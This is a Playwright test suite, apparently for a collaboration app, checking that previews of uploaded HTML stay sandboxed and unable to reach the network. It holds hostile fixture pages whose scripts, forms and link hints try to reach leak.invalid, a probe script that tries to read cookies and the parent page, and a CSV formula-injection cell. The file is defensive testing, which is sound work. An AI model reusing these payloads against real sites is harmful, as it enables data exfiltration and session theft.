"""Browser tests for file previews (C-60, #1252): someone else's HTML in a sandboxed, network-less frame, and the viewer.

Runs through scripts/check_ui.sh test_file_preview. The negative security tests open a hostile HTML file the way a reader would (the
row's name, then the viewer) and assert that nothing in it runs, nothing leaves the browser, the Flux session is unreachable and the
Flux page around it is unchanged; with Run scripts, its scripts run in an opaque origin that still reaches nothing. The API half (the
route's headers, frame-only answer and access) is tests/app/file-preview.test.ts. FLUX_UI_BROWSER selects chromium (default) or webkit.
"""

from __future__ import annotations

import os
import re
import socket
import threading
import time
import unittest
import uuid

from playwright.sync_api import Browser, BrowserContext, Page, expect, sync_playwright

from test_app_shell import DESKTOP, ORIGIN, PHONE, UPSTREAM, start_forwarder

UI_BROWSER = os.environ.get("FLUX_UI_BROWSER", "chromium")
if UI_BROWSER not in ("chromium", "webkit"):
    raise ValueError(f"FLUX_UI_BROWSER must be chromium or webkit, got {UI_BROWSER!r}")
SHOTS = os.environ.get("FLUX_UI_SCREENSHOTS")
PASSWORD = "previews stay in their box"
STAMP = int(time.time() * 1000)
PEOPLE = {"ada": ("Ada Kowalska", f"ada.preview+{STAMP}@example.test"), "jonas": ("Jonas Berg", f"jonas.preview+{STAMP}@example.test")}
LEAK = "leak.invalid"


class Listener:
    """A real TCP listener on loopback that counts connections: a preconnect never shows as a request, only as a connection."""

    def __init__(self) -> None:
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.bind(("127.0.0.1", 0))
        self.server.listen(16)
        self.port = self.server.getsockname()[1]
        self.connections = 0
        threading.Thread(target=self.serve, daemon=True).start()

    def serve(self) -> None:
        while True:
            client, _ = self.server.accept()
            self.connections += 1
            try:
                client.settimeout(1)
                client.recv(4096)
                client.sendall(b"HTTP/1.1 204 No Content\r\nConnection: close\r\n\r\n")
            except OSError:
                pass
            finally:
                client.close()


TRAP = Listener()
TRAP_URL = f"http://127.0.0.1:{TRAP.port}"
DOT = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAAAF0lEQVR4nGNkYPjPQApgIkn1qIZRDcNKAwBXRgEfVhUMcgAAAABJRU5ErkJggg=="

# Every way a page could run code or reach out without being asked: none of it may work while scripts are off.
HOSTILE = f"""<!doctype html><html><head><meta charset="utf-8">
<meta http-equiv="refresh" content="1;url=https://{LEAK}/refresh">
<base href="https://{LEAK}/base/">
<link rel="stylesheet" href="https://{LEAK}/style.css"><link rel="preload" as="image" href="https://{LEAK}/preload.png">
<link rel="prefetch" href="https://{LEAK}/prefetch"><link rel="icon" href="https://{LEAK}/favicon.ico">
<meta http-equiv="x-dns-prefetch-control" content="on"><META HTTP-EQUIV="refresh" CONTENT="0;url={TRAP_URL}/meta">
<link rel="preconnect" href="{TRAP_URL}"><LINK REL="dns-prefetch" HREF="{TRAP_URL}"><link rel="preload" as="fetch" href="{TRAP_URL}/preload">
<link rel="modulepreload" href="{TRAP_URL}/module.js"><link rel="prerender" href="{TRAP_URL}/prerender"><link
 rel="stylesheet" href="{TRAP_URL}/style.css">
<style>@import url(https://{LEAK}/import.css); body {{ font: 16px/1.5 Georgia, serif; margin: 32px; background-image: url(https://{LEAK}/bg.png); }}
@font-face {{ font-family: Leak; src: url(https://{LEAK}/font.woff2); }} h1 {{ font-family: Leak, Georgia, serif; color: rgb(30, 80, 160); }}</style>
<script>document.title = 'owned'; document.getElementById && (window.__ran = 1); parent.postMessage('script', '*'); top.document.title = 'owned';
fetch('https://{LEAK}/fetch'); new Image().src = 'https://{LEAK}/script-img'; document.cookie;</script>
<script src="https://{LEAK}/remote.js"></script>
</head><body onload="parent.postMessage('onload', '*'); fetch('https://{LEAK}/onload')">
<h1 id="title">Gateway range report</h1>
<p id="lead">Signal at the far east bed, Saturday 14:00.</p>
<img id="inline" alt="inline dot" src="{DOT}" width="16" height="16">
<img id="remote" alt="remote pixel" src="https://{LEAK}/pixel.png" onerror="parent.postMessage('onerror', '*'); fetch('https://{LEAK}/onerror')">
<svg width="10" height="10"><image href="https://{LEAK}/svg.png" width="10" height="10"/></svg>
<video poster="https://{LEAK}/poster.png" src="https://{LEAK}/video.mp4" autoplay muted></video>
<audio src="https://{LEAK}/audio.mp3" autoplay></audio>
<iframe src="https://{LEAK}/frame"></iframe><object data="https://{LEAK}/object"></object><embed src="https://{LEAK}/embed">
<form id="form" action="https://{LEAK}/form" method="post"><input name="q" value="secret"><button id="send">Send</button></form>
<form action="https://{LEAK}/auto"><input autofocus onfocus="this.form.submit()"></form>
<a id="top" href="https://{LEAK}/top" target="_top">Open on top</a>
<a id="blank" href="https://{LEAK}/blank" target="_blank">Open a window</a>
<a id="file" href="{DOT}" download="dot.png">Download the dot</a>
<a id="ping" href="#lead" ping="https://{LEAK}/ping">Ping</a>
<a id="plain" href="https://{LEAK}/plain">A plain link</a> <a id="self" href="/">Flux itself</a>
<div style="background: url(https://{LEAK}/inline-style.png)">styled</div>
</body></html>""".encode()

# The same hints in a page with a UTF-16 byte-order mark: the browser decodes it as UTF-16 whatever the header says (C-60).
PAGE16 = (f'<link rel="preconnect" href="{TRAP_URL}"><LINK rel="preload" as="fetch" href="{TRAP_URL}/preload16">'
          f'<link rel="dns-prefetch" href="{TRAP_URL}"><meta http-equiv="refresh" content="0;url={TRAP_URL}/meta16">'
          '<h1 id="title">Sixteen-bit report</h1><p>Zażółć gęślą jaźń</p>')
UTF16 = {"le": b"\xff\xfe" + PAGE16.encode("utf-16-le"), "be": b"\xfe\xff" + PAGE16.encode("utf-16-be")}

# With Run scripts: what the page's own script can reach, written into the page for the test to read.
PROBE = f"""<!doctype html><html><head><meta charset="utf-8"><title>Probe</title></head><body>
<h1 id="title">Script probe</h1><ul id="out"></ul>
<script>
const say = (key, value) => {{ const li = document.createElement('li'); li.id = key; li.textContent = key + ': ' + value; document.getElementById('out').append(li); }};
const tryIt = (key, run) => {{ try {{ say(key, run()); }} catch (error) {{ say(key, 'blocked ' + error.name); }} }};
say('ran', 'yes');
say('origin', String(self.origin));
tryIt('cookie', () => 'read ' + JSON.stringify(document.cookie));
tryIt('storage', () => {{ localStorage.setItem('x', '1'); return 'read'; }});
tryIt('parent', () => 'read ' + parent.document.title);
tryIt('top', () => {{ top.location.href = 'https://{LEAK}/top'; return 'asked'; }});
tryIt('open', () => 'got ' + String(window.open('https://{LEAK}/open')));
tryIt('alert', () => {{ alert('owned'); return 'returned'; }});
parent.postMessage({{ flux: 'owned' }}, '*');
fetch('/api/v1/me').then(() => say('api', 'read'), (error) => say('api', 'blocked ' + error.name));
fetch('https://{LEAK}/fetch').then(() => say('fetch', 'read'), (error) => say('fetch', 'blocked ' + error.name));
const img = new Image(); img.onload = () => say('image', 'loaded'); img.onerror = () => say('image', 'blocked'); img.src = 'https://{LEAK}/pixel.png';
try {{ const socket = new WebSocket('wss://{LEAK}/socket'); socket.onerror = () => say('socket', 'blocked'); }} catch (error) {{ say('socket', 'blocked ' + error.name); }}
const form = document.createElement('form'); form.action = 'https://{LEAK}/form'; form.method = 'post'; document.body.append(form);
tryIt('form', () => {{ form.submit(); return 'asked'; }});
setTimeout(() => say('done', 'yes'), 400);
</script></body></html>""".encode()

REPORT = """<!doctype html><html><head><meta charset="utf-8"><title>Range</title><style>
body { font: 15px/1.5 system-ui, sans-serif; margin: 40px; color: #222; } table { border-collapse: collapse; } td, th { border: 1px solid #ccc; padding: 4px 10px; }
h1 { font-size: 24px; } .ok { color: #2a7a3a; }</style></head><body>
<h1>LoRa range, far east beds</h1><p>Readings from Saturday's walk with the handheld gateway, 14:00–15:30.</p>
<table><tr><th>Bed</th><th>RSSI</th><th>SNR</th></tr><tr><td>Far east</td><td>-112</td><td>-4.5</td></tr><tr><td>North</td><td>-98</td><td>2.1</td></tr>
<tr><td>Shed</td><td>-87</td><td class="ok">7.9</td></tr></table><p>The hedge costs about 14 dB. Mount sensor 3 on the post, not the fence.</p>
</body></html>""".encode()


def sandbox_refusal(message: str) -> bool:
    """A refusal the sandbox of the preview itself reports, which is the behaviour under test, not a fault of Flux's page."""
    text = message.lower()
    return "service worker is disabled because the context is sandboxed" in text or (
        "sandboxed" in text and "flag is not set" in text and "/preview" in text or "not allowed in a sandboxed frame" in text)


def pdf_bytes() -> bytes:
    """A real one-page PDF with a line of text."""
    stream = b"BT /F1 24 Tf 40 100 Td (Gateway placement) Tj ET"
    objects = [b"<< /Type /Catalog /Pages 2 0 R >>", b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
               b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 300 200] /Contents 4 0 R /Resources << /Font << /F1 5 0 R >> >> >>",
               b"<< /Length %d >>\nstream\n" % len(stream) + stream + b"\nendstream", b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>"]
    out, offsets = b"%PDF-1.4\n", []
    for number, body in enumerate(objects, 1):
        offsets.append(len(out))
        out += b"%d 0 obj\n" % number + body + b"\nendobj\n"
    xref = len(out)
    out += b"xref\n0 %d\n0000000000 65535 f \n" % (len(objects) + 1) + b"".join(b"%010d 00000 n \n" % o for o in offsets)
    return out + b"trailer\n<< /Size %d /Root 1 0 R >>\nstartxref\n%d\n%%%%EOF\n" % (len(objects) + 1, xref)


LIMIT = 5 * 1024 * 1024
LOG = b"".join(f"2026-11-07T14:{(n // 60) % 60:02d}:{n % 60:02d}Z gateway-3 uplink fcnt={n} rssi=-{90 + n % 30} snr={n % 11 - 4}.5 sf=9 bw=125 freq=868.{n % 9}\n".encode()
               for n in range(52_000))[:LIMIT - 4096]
BIG_CSV = (b"time,bed,rssi,snr,battery,note\n" + b"".join(f"2026-11-07T14:{(n // 60) % 60:02d}:{n % 60:02d}Z,bed {n % 40},-{90 + n % 30},{n % 11 - 4}.5,3.{n % 99:02d},ok\n".encode()
                                                            for n in range(110_000)))
BIG_CSV = BIG_CSV[:BIG_CSV.rindex(b"\n", 0, LIMIT - 4096) + 1]
BIG_CSV_ROWS = BIG_CSV.count(b"\n") - 1
BIG_JSON = ("[" + ",".join(f'{{"id":{n},"bed":"bed {n % 40}","readings":{{"rssi":-{90 + n % 30},"snr":{n % 11 - 4}.5}},"tags":["lora","sf9"]}}' for n in range(60_000)) + "]").encode()
COMMAS = b"," * (4 * 1024 * 1024)  # one row of 4,194,305 empty cells: any member can send it
WIDE = ("\n".join(",".join(f"s{c}" if r == 0 else str((r * c) % 997) for c in range(2000)) for r in range(300)) + "\n").encode()
assert len(BIG_JSON) < LIMIT and len(LOG) < LIMIT and len(BIG_CSV) < LIMIT and len(COMMAS) < LIMIT and len(WIDE) < LIMIT
SMALL_LOG = b"gateway-3 boot ok\n\tsf=9 bw=125\nuplink fcnt=1 rssi=-112 snr=-4.5\n" + b"x" * 300 + b"\n"
LATIN = "Caf\u00e9 north bed, 12\u00b0C\n".encode("windows-1252")
JSON_OK = b'{"gateway": "gw-3", "beds": [{"name": "far east", "rssi": -112}, {"name": "north", "rssi": -98}], "ok": true, "note": null}'
JSON_BAD = b'{\n  "gateway": "gw-3",\n  "beds": [1, 2,, 3]\n}\n'
CSV = b'bed,rssi,note\nfar east,-112,"behind the hedge, low"\nnorth,-98,"=HYPERLINK(""https://leak.invalid/x"",""click"")"\nshed,-87,@SUM(1+1)\nsouth,+5,-2+3\n'
TSV = b"bed\trssi\nfar east\t-112\nnorth\t-98\n"
SOURCE = b"def rssi(beds):\n    return {b: -112 for b in beds}\n"


class FilePreview(unittest.TestCase):
    pw = None
    browser: Browser
    states: dict[str, dict] = {}
    ids: dict[str, str] = {}

    @classmethod
    def setUpClass(cls) -> None:
        if UPSTREAM:
            start_forwarder(ORIGIN, UPSTREAM)
        cls.pw = sync_playwright().start()
        cls.browser = getattr(cls.pw, UI_BROWSER).launch()
        expect.set_options(timeout=10000)
        contexts: dict[str, BrowserContext] = {}
        for key, (name, email) in PEOPLE.items():
            context = cls.browser.new_context(base_url=ORIGIN, service_workers="block")
            response = context.request.post("/api/auth/sign-up/email", data={"email": email, "password": PASSWORD, "name": name}, headers={"origin": ORIGIN})
            assert response.status == 200, response.text()
            cls.ids[key] = context.request.get("/api/v1/me").json()["user"]["id"]
            cls.states[key] = context.storage_state()
            contexts[key] = context

        def post(who: str, path: str, body: dict) -> dict:
            response = contexts[who].request.post(path, data=body, headers={"origin": ORIGIN})
            assert response.status in (200, 201), f"{path}: {response.status} {response.text()}"
            return response.json()

        ws = post("ada", "/api/v1/workspaces", {"name": "Community garden"})
        post("ada", f"/api/v1/workspaces/{ws['id']}/members", {"email": PEOPLE["jonas"][1], "role": "member"})
        pid = post("ada", f"/api/v1/workspaces/{ws['id']}/projects", {"name": "Community garden sensors", "visibility": "restricted"})["id"]
        cls.ids["grant"] = post("ada", f"/api/v1/projects/{pid}/grants", {"principal": {"kind": "human", "id": cls.ids["jonas"]}, "role": "contributor"})["id"]
        cls.ids["project"] = pid

        def root(key: str, body: str, name: str, data: bytes) -> None:
            upload = contexts["ada"].request.post(f"/api/v1/projects/{pid}/files?uploadId={uuid.uuid4()}&name={name}", data=data,
                                                  headers={"origin": ORIGIN, "content-type": "application/octet-stream"})
            assert upload.status == 201, upload.text()
            started = post("ada", f"/api/v1/projects/{pid}/conversations", {"body": body, "attachmentIds": [upload.json()["id"]], "clientMessageId": str(uuid.uuid4())})
            cls.ids[key] = started["messages"][0]["id"]
            cls.ids[f"conversation:{key}"] = started["id"]
            cls.ids[f"file:{key}"] = upload.json()["id"]

        root("report", "Range report from Saturday", "range-report.html", REPORT)
        root("hostile", "The vendor's page, as they sent it", "vendor-page.html", HOSTILE)
        root("probe", "A page with a script", "probe.html", PROBE)
        for order, data in UTF16.items():
            root(f"utf16{order}", f"A UTF-16{order.upper()} page", f"report-{order}.html", data)
        for key, name, data in (("log", "gateway.log", SMALL_LOG), ("latin", "notes.txt", LATIN), ("json", "beds.json", JSON_OK),
                                ("bad", "broken.json", JSON_BAD), ("csv", "range.csv", CSV), ("tsv", "range.tsv", TSV),
                                ("source", "rssi.py", SOURCE), ("pdf", "placement.pdf", pdf_bytes()),
                                ("big-log", "uplinks.log", LOG), ("big-csv", "uplinks.csv", BIG_CSV), ("big-json", "uplinks.json", BIG_JSON),
                                ("commas", "commas.csv", COMMAS), ("wide", "matrix.csv", WIDE)):
            root(key, f"File {name}", name, data)
        for context in contexts.values():
            context.close()

    @classmethod
    def tearDownClass(cls) -> None:
        cls.browser.close()
        cls.pw.stop()

    def open(self, key: str, who: str = "jonas", phone: bool = False, dark: bool = False, quiet_stream: bool = False) -> tuple[Page, list[str], dict]:
        """The conversation holding `key`'s file, with every request that leaves Flux's origin recorded (and stopped)."""
        options: dict = {"base_url": ORIGIN, "locale": "en-GB", "timezone_id": "Europe/Warsaw", "storage_state": self.states[who],
                         "color_scheme": "dark" if dark else "light", "service_workers": "block"}
        options.update(viewport=PHONE, device_scale_factor=3, is_mobile=True, has_touch=True) if phone else options.update(viewport=DESKTOP)
        context = self.browser.new_context(**options)
        self.addCleanup(context.close)
        outside: list[str] = []

        def leave(route) -> None:
            outside.append(route.request.url)
            route.abort()
        context.route(lambda url: not url.startswith(ORIGIN) and not url.startswith("data:") and not url.startswith("blob:"), leave)
        events: dict = {"pages": [], "downloads": [], "dialogs": []}
        page = context.new_page()
        context.on("page", lambda opened: events["pages"].append(opened.url))
        errors: list[str] = []
        # The browser's own refusals inside the sandboxed preview are not the page's errors: Playwright's service-worker block reads
        # navigator.serviceWorker in every frame (Chromium: "Service worker", WebKit: "Service Worker"), and WebKit also reports the
        # top navigation and the alert the hostile pages try ("... is sandboxed ... flag is not set"). Anything else is kept.
        page.on("pageerror", lambda error: None if sandbox_refusal(str(error)) else errors.append(str(error)))
        page.on("download", lambda download: events["downloads"].append(download.suggested_filename))
        page.on("dialog", lambda dialog: (events["dialogs"].append(dialog.message), dialog.dismiss()))
        self.addCleanup(lambda: self.assertEqual(errors, [], "no uncaught page errors"))
        if quiet_stream:
            # The reader's tab has not heard of the change yet: the live stream is held open and says nothing.
            page.route_web_socket(re.compile(r".*/api/v1/stream.*"), lambda socket: None)
        page.goto(f"/projects/{self.ids['project']}")
        message = page.locator(f"#message-{self.ids[key]}")
        message.scroll_into_view_if_needed()
        expect(message).to_be_visible()
        # The Flux page records every message that reaches it, so the test can tell the preview said nothing to it.
        page.evaluate("() => { window.__messages = []; addEventListener('message', (event) => window.__messages.push(String(event.data && JSON.stringify(event.data)))); }")
        return page, outside, events

    def shot(self, page: Page, name: str) -> None:
        if SHOTS:
            page.evaluate("document.fonts.ready.then(() => true)")
            page.wait_for_timeout(500)
            page.screenshot(path=os.path.join(SHOTS, f"{name}-{UI_BROWSER}.png"))

    def viewer(self, page: Page, key: str, name: str):
        message = page.locator(f"#message-{self.ids[key]}")
        message.get_by_role("button", name=f"Preview {name}").click()
        dialog = page.get_by_role("dialog", name=name)
        expect(dialog).to_be_visible()
        return message, dialog

    def test_01_html_opens_as_authored_with_download_close_and_esc(self) -> None:
        for phone in (False, True):
            for dark in (False, True):
                with self.subTest(phone=phone, dark=dark):
                    page, outside, _ = self.open("report", phone=phone, dark=dark)
                    message, dialog = self.viewer(page, "report", "range-report.html")
                    expect(dialog).to_contain_text("Code · ")
                    frame = dialog.locator("iframe")
                    expect(frame).to_have_attribute("sandbox", "")
                    expect(frame).to_have_attribute("src", f"/api/v1/files/{self.ids['file:report']}/preview")
                    page_in_frame = page.frame_locator(".file-viewer iframe")
                    expect(page_in_frame.get_by_role("heading", name="LoRa range, far east beds")).to_be_visible()
                    expect(page_in_frame.get_by_role("cell", name="-112")).to_be_visible()
                    expect(dialog.get_by_role("status")).to_have_text(re.compile(r"^External images and scripts are blocked\. ?Run scripts · View source$"))
                    download = dialog.get_by_role("link", name="Download")
                    expect(download).to_have_attribute("href", f"/api/v1/files/{self.ids['file:report']}")
                    expect(download).to_have_attribute("download", "range-report.html")
                    # The frame is the page as authored: its own white page, not Flux's surface.
                    self.assertEqual(frame.evaluate("(el) => getComputedStyle(el).backgroundColor"), "rgb(255, 255, 255)")
                    self.shot(page, f"file-preview-html-{'390' if phone else '1440'}-{'dark' if dark else 'light'}")
                    if not phone:
                        with page.expect_download() as saved:
                            download.click()
                        self.assertEqual(saved.value.suggested_filename, "range-report.html")
                    dialog.get_by_role("button", name="Close preview").click()
                    expect(dialog).to_have_count(0)
                    opener = message.get_by_role("button", name="Preview range-report.html")
                    expect(opener).to_be_focused()
                    opener.press("Enter")
                    expect(dialog).to_be_visible()
                    expect(dialog.get_by_role("button", name="Close preview")).to_be_focused()
                    page.keyboard.press("Escape")
                    expect(dialog).to_have_count(0)
                    expect(opener).to_be_focused()
                    # The row's own Download stays a download, apart from the preview.
                    row_download = message.get_by_role("link", name="Download range-report.html")
                    expect(row_download).to_have_attribute("download", "range-report.html")
                    self.assertEqual(outside, [])

    def test_02_a_hostile_page_runs_nothing_and_reaches_nothing(self) -> None:
        page, outside, events = self.open("hostile")
        title, url = page.title(), page.url
        _, dialog = self.viewer(page, "hostile", "vendor-page.html")
        inside = page.frame_locator(".file-viewer iframe")
        expect(inside.locator("#title")).to_have_text("Gateway range report")
        # Clicks a person might make: none submits, opens a window, navigates Flux or downloads.
        for target in ("#send", "#top", "#blank", "#file"):
            inside.locator(target).click()
        page.wait_for_timeout(2500)  # past the page's 1 s refresh
        frame = next(f for f in page.frames if f.url.endswith(f"/files/{self.ids['file:hostile']}/preview"))
        self.assertEqual(frame.url, f"{ORIGIN}/api/v1/files/{self.ids['file:hostile']}/preview", "no refresh, form or link moved the frame")
        expect(inside.locator("#title")).to_have_text("Gateway range report")
        self.assertEqual(outside, [], "nothing left the browser")
        # Not even a connection: a preconnect or DNS prefetch is a hint the browser may act on without asking the policy (WebKit did),
        # so the preview sends every <link> and <meta> inert (C-60).
        self.assertEqual(TRAP.connections, 0, "no connection was opened to a host the page names")
        self.assertEqual(events["pages"], [], "no window opened")
        self.assertEqual(events["downloads"], [], "no download started from inside the preview")
        self.assertEqual(events["dialogs"], [])
        self.assertEqual(page.evaluate("window.__messages"), [], "the page told Flux nothing")
        self.assertEqual((page.title(), page.url), (title, url), "the Flux page is unchanged")
        # The inline data: image draws; the remote one and the remote font do not.
        self.assertTrue(inside.locator("#inline").evaluate("(img) => img.complete && img.naturalWidth === 16"))
        self.assertFalse(inside.locator("#remote").evaluate("(img) => img.naturalWidth > 0"))
        self.assertIsNone(frame.evaluate("window.__ran ?? null"), "the page's script did not run")
        self.assertEqual(frame.evaluate("document.title"), "", "the page's script did not rename it")
        self.assertEqual(frame.evaluate("self.origin"), "null", "an opaque origin")
        expect(dialog).to_be_visible()
        # A link a person clicks loads nothing either: the Flux page frames only its own origin, and Flux refuses to be framed.
        for target in ("#plain", "#ping", "#self"):
            if inside.locator(target).count():
                inside.locator(target).click()
                page.wait_for_timeout(600)
        self.assertEqual(outside, [], "a clicked link left nothing")
        self.assertEqual((page.title(), page.url), (title, url))
        self.assertEqual(events["pages"], [])
        # The Flux page's own policy refused the other site in its frame: the browser reported it to the test stack. Seen here, it is
        # taken off the list the run's CSP gate reads (scripts/csp_gate.sh), as is a report of Flux's page refusing to be framed.
        token = os.environ.get("FLUX_FIXTURE_TOKEN", "")
        bearer = {"authorization": f"Bearer {token}", "origin": ORIGIN}  # the context carries the reader's session cookie
        deadline = time.time() + 10
        seen: set[str] = set()
        while time.time() < deadline and "frame-src" not in seen:
            reports = page.request.get("/api/v1/test/csp-reports", headers=bearer).json()["reports"]
            seen = {r["directive"] for r in reports if r["directive"] == "frame-src" and LEAK in r["blocked"]}
            page.wait_for_timeout(300)
        for directive in ("frame-src", "frame-ancestors"):
            removed = page.request.delete(f"/api/v1/test/csp-reports?directive={directive}", headers=bearer)
            self.assertEqual(removed.status, 204, removed.text())
        if UI_BROWSER == "chromium":
            self.assertEqual(seen, {"frame-src"}, "the Flux page refused the other site in its frame")  # not every engine reports it
        self.assert_recorder_sees(page, outside)

    def test_02a_a_utf16_page_is_made_inert_too(self) -> None:
        for order in UTF16:
            with self.subTest(order=order):
                before = TRAP.connections
                page, outside, events = self.open(f"utf16{order}")
                self.viewer(page, f"utf16{order}", f"report-{order}.html")
                inside = page.frame_locator(".file-viewer iframe")
                expect(inside.locator("#title")).to_have_text("Sixteen-bit report")
                expect(inside.get_by_text("Zażółć gęślą jaźń")).to_be_visible()
                page.wait_for_timeout(2000)
                self.assertEqual(outside, [], "nothing left the browser")
                self.assertEqual(TRAP.connections, before, "no connection was opened to a host the page names")
                self.assertEqual(events["pages"], [])

    def test_02b_the_connection_counter_sees_a_connection(self) -> None:
        """Control for test_02: the listener counts a connection this browser does open."""
        context = self.browser.new_context(service_workers="block")
        self.addCleanup(context.close)
        before = TRAP.connections
        try:
            context.new_page().goto(f"{TRAP_URL}/control", timeout=5000)
        except Exception:
            pass
        self.assertGreater(TRAP.connections, before)

    def assert_recorder_sees(self, page: Page, outside: list[str]) -> None:
        """Control: a request that does leave this browser context is recorded, so an empty record means nothing left."""
        control = page.context.new_page()
        try:
            control.goto(f"https://{LEAK}/control")
        except Exception:
            pass
        control.close()
        self.assertEqual(outside, [f"https://{LEAK}/control"])

    def test_03_run_scripts_runs_them_in_an_opaque_origin_that_reaches_nothing(self) -> None:
        page, outside, events = self.open("probe")
        title, url = page.title(), page.url
        _, dialog = self.viewer(page, "probe", "probe.html")
        inside = page.frame_locator(".file-viewer iframe")
        expect(inside.locator("#title")).to_have_text("Script probe")
        expect(inside.locator("#ran")).to_have_count(0)
        self.shot(page, "file-preview-html-scripts-off-1440-light")
        dialog.get_by_role("button", name="Run scripts").click()
        expect(dialog.get_by_role("status")).to_have_text("Scripts are on for this preview. A script may contact the internet. · View source")
        frame = dialog.locator("iframe")
        expect(frame).to_have_attribute("sandbox", "allow-scripts")
        expect(frame).to_have_attribute("src", f"/api/v1/files/{self.ids['file:probe']}/preview?scripts=1")
        expect(inside.locator("#done")).to_have_text("done: yes")
        expect(inside.locator("#ran")).to_have_text("ran: yes")
        expect(inside.locator("#origin")).to_have_text("origin: null")
        expect(inside.locator("#cookie")).to_have_text(re.compile(r"^cookie: blocked SecurityError$"))
        expect(inside.locator("#storage")).to_have_text(re.compile(r"^storage: blocked SecurityError$"))
        expect(inside.locator("#parent")).to_have_text(re.compile(r"^parent: blocked SecurityError$"))
        expect(inside.locator("#api")).to_have_text(re.compile(r"^api: blocked "))
        expect(inside.locator("#fetch")).to_have_text(re.compile(r"^fetch: blocked "))
        expect(inside.locator("#image")).to_have_text("image: blocked")
        expect(inside.locator("#open")).to_have_text("open: got null")
        self.shot(page, "file-preview-html-scripts-on-1440-light")
        page.wait_for_timeout(800)
        self.assertEqual(outside, [], "nothing left the browser")
        self.assertEqual(events["pages"], [])
        self.assertEqual(events["dialogs"], [], "no modal")
        expect(inside.locator("#alert")).to_have_text(re.compile(r"^alert: (returned|blocked)"))
        expect(inside.locator("#form")).to_have_text(re.compile(r"^form: (asked|blocked)"))
        self.assertEqual((page.title(), page.url), (title, url), "top navigation was refused and the Flux page is unchanged")
        # postMessage reaches the parent's window (the browser delivers it), but nothing in Flux listens: the page is unchanged.
        expect(dialog).to_be_visible()
        # Closing turns scripts off again: the next open is still.
        dialog.get_by_role("button", name="Close preview").click()
        _, dialog = self.viewer(page, "probe", "probe.html")
        expect(dialog.locator("iframe")).to_have_attribute("sandbox", "")
        expect(page.frame_locator(".file-viewer iframe").locator("#title")).to_have_text("Script probe")
        expect(page.frame_locator(".file-viewer iframe").locator("#ran")).to_have_count(0)
        self.assertEqual(outside, [])
        self.assert_recorder_sees(page, outside)

    def contents(self, dialog, name: str):
        return dialog.get_by_role("region", name=f"Contents of {name}")

    def test_05_html_view_source_shows_the_markup_as_text(self) -> None:
        page, outside, _ = self.open("report")
        _, dialog = self.viewer(page, "report", "range-report.html")
        dialog.get_by_role("button", name="View source").click()
        source = self.contents(dialog, "range-report.html")
        expect(source).to_contain_text("<h1>LoRa range, far east beds</h1>")
        expect(dialog.locator("iframe")).to_have_count(0)
        expect(source.locator("h1")).to_have_count(0)
        dialog.get_by_role("button", name="Preview", exact=True).click()
        expect(page.frame_locator(".file-viewer iframe").get_by_role("heading", name="LoRa range, far east beds")).to_be_visible()
        self.assertEqual(outside, [])

    def test_06_text_log_and_source_are_monospace_and_wrapped(self) -> None:
        for phone in (False, True):
            for dark in (False, True):
                with self.subTest(phone=phone, dark=dark):
                    page, outside, _ = self.open("log", phone=phone, dark=dark)
                    _, dialog = self.viewer(page, "log", "gateway.log")
                    text = self.contents(dialog, "gateway.log")
                    expect(text).to_contain_text("gateway-3 boot ok")
                    expect(text).to_contain_text("uplink fcnt=1 rssi=-112 snr=-4.5")
                    self.assertIn("Geist Mono", text.evaluate("(el) => getComputedStyle(el).fontFamily"))
                    long = text.locator(".file-viewer__line").nth(3)
                    self.assertGreater(long.bounding_box()["height"], text.locator(".file-viewer__line").first.bounding_box()["height"] * 1.5, "a long line wraps")
                    self.assertLessEqual(long.bounding_box()["width"], text.bounding_box()["width"], "and does not scroll sideways")
                    expect(text.locator(".file-viewer__num")).to_have_count(0)
                    self.shot(page, f"file-preview-text-{'390' if phone else '1440'}-{'dark' if dark else 'light'}")
                    dialog.get_by_role("button", name="Show line numbers").click()
                    expect(text.locator(".file-viewer__num").first).to_have_text("1")
                    dialog.get_by_role("button", name="Hide line numbers").click()
                    expect(text.locator(".file-viewer__num")).to_have_count(0)
                    self.assertEqual(outside, [])
        page, _, _ = self.open("source")
        _, dialog = self.viewer(page, "source", "rssi.py")
        expect(self.contents(dialog, "rssi.py")).to_contain_text("return {b: -112 for b in beds}")
        page, _, _ = self.open("latin")
        _, dialog = self.viewer(page, "latin", "notes.txt")
        expect(self.contents(dialog, "notes.txt")).to_contain_text("Café north bed, 12°C")
        expect(dialog.get_by_role("status")).to_contain_text("Shown as Windows-1252 text.")

    def test_07_json_is_pretty_and_folds_and_invalid_json_says_where(self) -> None:
        for phone in (False, True):
            for dark in (False, True):
                with self.subTest(phone=phone, dark=dark):
                    page, outside, _ = self.open("json", phone=phone, dark=dark)
                    _, dialog = self.viewer(page, "json", "beds.json")
                    tree = self.contents(dialog, "beds.json")
                    expect(tree.locator(".file-viewer__line").nth(1)).to_have_text('"gateway": "gw-3",')
                    expect(tree).to_contain_text('"name": "far east",')
                    self.shot(page, f"file-preview-json-{'390' if phone else '1440'}-{'dark' if dark else 'light'}")
                    beds = tree.locator(".file-viewer__line").nth(2)
                    expect(beds).to_have_text('"beds": [')
                    beds.get_by_role("button", name="Fold").click()
                    expect(tree.locator(".file-viewer__line").nth(2)).to_have_text('"beds": [ … 2 items ],')
                    expect(tree).not_to_contain_text("far east")
                    tree.locator(".file-viewer__line").nth(2).get_by_role("button", name="Unfold").click()
                    expect(tree).to_contain_text('"name": "far east",')
                    self.assertEqual(outside, [])
        page, _, _ = self.open("bad")
        _, dialog = self.viewer(page, "bad", "broken.json")
        expect(dialog.get_by_role("alert")).to_have_text("Not valid JSON: line 3, column 17: Unexpected \",\".")
        expect(self.contents(dialog, "broken.json")).to_contain_text('"beds": [1, 2,, 3]')
        self.shot(page, "file-preview-json-invalid-1440-light")

    def test_08_csv_and_tsv_are_tables_whose_formulas_stay_text(self) -> None:
        for phone in (False, True):
            for dark in (False, True):
                with self.subTest(phone=phone, dark=dark):
                    page, outside, _ = self.open("csv", phone=phone, dark=dark)
                    _, dialog = self.viewer(page, "csv", "range.csv")
                    table = dialog.get_by_role("table", name="Contents of range.csv")
                    expect(table.get_by_role("columnheader")).to_have_text(["bed", "rssi", "note"])
                    expect(table.get_by_role("cell", name="behind the hedge, low")).to_be_visible()
                    formula = table.get_by_role("cell", name='=HYPERLINK("https://leak.invalid/x","click")')
